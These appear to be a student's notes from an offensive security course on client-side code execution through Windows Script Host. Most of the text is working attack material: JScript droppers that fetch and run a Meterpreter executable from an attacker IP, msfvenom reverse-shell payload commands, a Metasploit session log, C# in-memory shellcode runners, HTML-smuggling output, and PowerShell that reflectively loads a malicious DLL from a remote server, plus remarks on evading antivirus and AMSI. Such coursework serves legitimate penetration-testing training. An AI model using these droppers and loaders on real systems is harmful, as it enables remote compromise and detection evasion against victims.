### Jscript on Windows 10
- Javascript attachments as alternative to Office VBA macros
- phishing attacks
- executing jscript outside a browser bypasses security settings

##### JS Script to open calc.exe
```js
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("calc.exe");
```

#### VBScript to open calc.exe
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "calc.exe"
Set objShell = Nothing
```

### JScript Meterpreter Dropper

- _MSXML2.XMLHTTP_ object, which is based on the Microsoft XML Core Services, and its associated HTTP protocol parser. This object provides client-side protocol support to communicate with HTTP servers. Although it is not documented, it is present in all modern versions of Windows.
- To summarize our code, we'll use the (_url_) variable to set the URL of the Meterpreter executable. Then we'll create a Windows Script _MSXML2.XMLHTTP_ object and call the _Open_ method on that object to specify a GET request along with the URL. Finally, we'll send the GET request to download the file.
- met.exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f exe -o met.exe
```
```Jscript
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

- start webserver on kali host `python3 -m http.server 80`
- met.js
```javascript
var url = "http://192.168.1.110/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

- start metasploit on kali
- metasploit commands
```shell
usemsf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > set lhost eth0
lhost => 192.168.1.110
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.110    yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set EXITFUNC thread
EXITFUNC => thread
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.1.110:443
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Staging x64 payload (202844 bytes) ...
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.110:443 -> 192.168.1.135:52618) at 2024-05-11 14:15:46 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: 
```

- If we needed to set a proxy `oSrvXMLHTTPRequest.setProxy(proxySetting, varProxyServer, varBypassList);`
- MS Doc https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236(v=vs.85)?redirectedfrom=MSDN
- https://learn.microsoft.com/en-us/sql/ado/guide/data/command-streams?view=sql-server-ver16
- ADO stands for ActiveX Data Objects.  The ADO Stream Object is used to read, write, and manage a stream of binary or text data.

### JScript and Proxies

- download file
```js
var proxyServer = "http://192.168.250.12:3128"; // Your Squid proxy server
var url = "http://192.168.45.219/met.exe"; // URL to download the file from
var destination = "C:\\Windows\\Tasks\\met.exe"; // Destination path to save the file

// Set system proxy settings for the script
function setSystemProxy(proxyServer) {
    try {
        var WshShell = new ActiveXObject("WScript.Shell");
        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable", 1, "REG_DWORD");
        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer", proxyServer, "REG_SZ");
    } catch (e) {
        WScript.Echo("Failed to set proxy settings: " + e.message);
    }
}

// Function to download a file using XMLHttpRequest
function downloadFile(url, destination) {
    try {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        if (xhr.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Open();
            stream.Type = 1; // adTypeBinary
            stream.Write(xhr.responseBody);
            stream.Position = 0;

            var fso = new ActiveXObject("Scripting.FileSystemObject");
            if (fso.FileExists(destination)) {
                fso.DeleteFile(destination);
            }

            stream.SaveToFile(destination, 2); // adSaveCreateOverWrite
            stream.Close();
            WScript.Echo("File downloaded successfully to " + destination);
        } else {
            WScript.Echo("Failed to download file. HTTP status: " + xhr.status);
        }
    } catch (e) {
        WScript.Echo("Error: " + e.message);
    }
}

// Set the system proxy and download the file
setSystemProxy(proxyServer);
downloadFile(url, destination);

```
- to run from shell `cscript .\file.js`


## JScript and C\#

- JScript Shellcode Runner creates a dll in C# and then used DotNetToJscript.exe to convert the C# assembly
- run in memory rather than touching disk
- needed to rebuild DotNetToJscript dll due to the following error
```cmd
c:\Users\dooley\Documents\github\DotNetToJScript>DotNetToJScript\bin\Debug\DotNetToJScript.exe ExampleAssembly\bin\Debug\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
This tool should only be run on v2 of the CLR
```
- solution to issue https://github.com/tyranid/     DotNetToJScript/issues/19
- code to launch command prompt
```c#
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]

public class TestClass

{

    public TestClass()

    {
        // Create a new ProcessStartInfo object

        ProcessStartInfo psi = new ProcessStartInfo

        {

            FileName = "cmd.exe", // Specify the executable to run (cmd.exe)
            UseShellExecute = true // Use the shell to execute the process

        };

        // Start the process

        Process.Start(psi);

    }

    public void RunProcess(string path)

    {

        Process.Start(path);

    }

}
```

- When calling Win32 APIs from PowerShell (in the previous module), we demonstrated the straightforward _Add-Type_ method and the more complicated reflection technique. However, the complexity of reflection was well worth it as we avoided writing C# source code and compiled assembly files temporarily to disk during execution. Luckily, when dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem.

## Shellcode Runner in C\#

- A signaled state indicates a resource is available for a process or thread to use it. A not-signaled state indicates the resource is in use.
- import Win32 APIs to execute shellcode in memory
```c#
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, 
    uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

#### Example code 64-bit

- set CPU arch to x64
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

- buf
```bash 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
...

```


### SharpShooter

- python2 compliant one
- python3 fork https://github.com/SYANiDE-/SuperSharpShooter
	- needed to change requirements to `jsmin==3.0.0`
	- virtenv in ~/virtual-environments/supersharpshooter
- generate payload
```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f raw -o shell.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 622 bytes
Saved as: shell.txt
```
- convert to js 
```bash
❯ sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --output  test

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Shar'+'p'+'Sh'+'o'+'o'+'ter';
[*] Written delivery payload to output/test.js

```

### Smuggling 

```bash
sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --smuggle --template mcafee --output smuggle

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Sh'+'arp'+'Sho'+'ot'+'e'+'r';
[*] Written delivery payload to output/smuggle.js
[*] File [./output/smuggle.js] successfully loaded !  (will be smuggled in .html)
[*] Encrypted input file with key [haibrysxozefqzekgctaqwgcydmijpsr]
[*] File [./output/smuggle.html] successfully created !  
          ^^ Selected delivery method

```


## Reflective Load (Powershell)

- create project Class Library (.Net Framework)
- creating malicious dll

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1

{
    public class Class1

    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,

          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    public static void runner()

    {

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp

            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,                           ...                                  0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
                                                        0xd5};


            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

    }

}
```
- interact with powershell to get meterpreter staged payload
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.110/ClassLibrary1.dll', '<insert path>\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("<insert path>\ClassLibrary1.dll")

PS> $class = $assem.GetType("ClassLibrary1.Class1")

$method = $class.GetMethod("runner")

$method.Invoke(0, $null)
```
- Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the _Load_[1](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-1) method, which accepts a _Byte_ array in memory instead of a disk file. In this case, we'll modify our PowerShell code to use the _DownloadData_[2](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-2) method of the _Net.WebClient_ class to download the DLL as a byte array.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.110/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

Reflective loading in PowerShell is a technique used to load and execute a Dynamic Link Library (DLL) directly from memory, without the need for writing the DLL to disk. This approach is often used in offensive security scenarios, like in-memory execution of malicious code, because it avoids touching the filesystem, which can help evade antivirus detection and leave minimal traces for forensic analysis.

### **Key Concepts in Reflective Loading:**

1. **Reflection in Programming**: Reflection is the ability of a program to inspect, modify, or invoke its structure or behaviors at runtime. In PowerShell, this is often achieved using the .NET `System.Reflection` namespace, which provides mechanisms to load assemblies or modules into memory and invoke their methods dynamically.

2. **Reflective DLL Injection**: Traditionally, DLL injection is a technique where a DLL is loaded into the address space of another process. Reflective DLL loading is a stealthier version, where the DLL is loaded directly into the memory of the process using a custom loader, without writing the DLL to disk.

3. **PowerShell's Role**: PowerShell can facilitate reflective loading by using .NET and reflection to load a DLL directly from memory (or even from the web), bypassing the need to save the DLL to disk and potentially alerting security mechanisms like antivirus.

---

### **Example of Reflective Loading in PowerShell**

In the example below, PowerShell uses reflection to load a DLL file that’s stored as a byte array (which could have been downloaded from a remote source) and invokes a method from it:

```powershell
# Example: Reflectively load a DLL in PowerShell and execute a method

# Step 1: Load the DLL into memory as a byte array
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\dllfile.dll")

# Step 2: Use Assembly.Load to load the DLL into memory using reflection
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Step 3: Get the type from the loaded assembly
$type = $assembly.GetType("Namespace.ClassName")

# Step 4: Instantiate the class (if needed) or directly invoke a static method
$instance = [Activator]::CreateInstance($type)

# Step 5: Invoke a method on the instance (or on the class if it's a static method)
$method = $type.GetMethod("MethodName")
$method.Invoke($instance, $null)  # If the method takes parameters, provide them in the array instead of $null
```

---

### **Using PowerShell for Reflective DLL Injection**

In offensive security, reflective DLL injection via PowerShell is often used in combination with post-exploitation frameworks like **Cobalt Strike** or **Metasploit**. These tools generate shellcode that reflects a DLL into memory, which PowerShell can run.

Here’s an example that demonstrates loading a malicious DLL directly from the web:

```powershell
# Load DLL from a remote source (for instance, from an HTTP server)
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData("http://example.com/malicious.dll")

# Reflectively load the DLL into memory
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Get the type and invoke methods
$type = $assembly.GetType("MaliciousNamespace.MaliciousClass")
$method = $type.GetMethod("Execute")
$method.Invoke($null, $null)
```

### **Reflective Loading Tools in PowerShell**

Some tools and frameworks simplify the process of reflective loading for offensive purposes. Here are a few:

1. **Invoke-ReflectivePEInjection**: This script from PowerSploit allows you to inject a PE (Portable Executable) into the memory of a process using reflective DLL injection.
   
   Example usage:

   ```powershell
   Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessId 1234
   ```

2. **Invoke-Assembly**: This script allows you to reflectively load a .NET assembly and execute it in memory.

---

### **Reflective Loading vs Traditional Execution**

| **Aspect**                | **Traditional Execution**                                        | **Reflective Loading**                                         |
|---------------------------|------------------------------------------------------------------|----------------------------------------------------------------|
| **Disk I/O**               | Requires writing DLLs to disk before loading.                   | Loads DLLs directly into memory, avoiding disk I/O.            |
| **Detection**              | Easier for antivirus to detect because of file write operations. | Harder to detect since it avoids writing files to disk.        |
| **Forensics**              | Leaves artifacts on disk, making forensic analysis easier.       | Leaves fewer forensic traces because it operates in memory.    |
| **Persistence**            | Could be part of a persistent file or scheduled task.            | Typically used for in-memory execution without persistence.    |

---

### **Evading AMSI (Anti-Malware Scan Interface)**

AMSI is a Windows security feature that scans PowerShell code in memory. Reflective loading can help bypass AMSI since the DLL is loaded into memory and executed without ever being directly written or interpreted as a PowerShell script.

However, depending on how the PowerShell script is structured, AMSI might still intercept and scan portions of the PowerShell code. Some advanced offensive techniques attempt to **patch AMSI** in-memory (using tools like **AMSI bypasses**) before performing reflective loading.

---

## TO DO:
- Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.
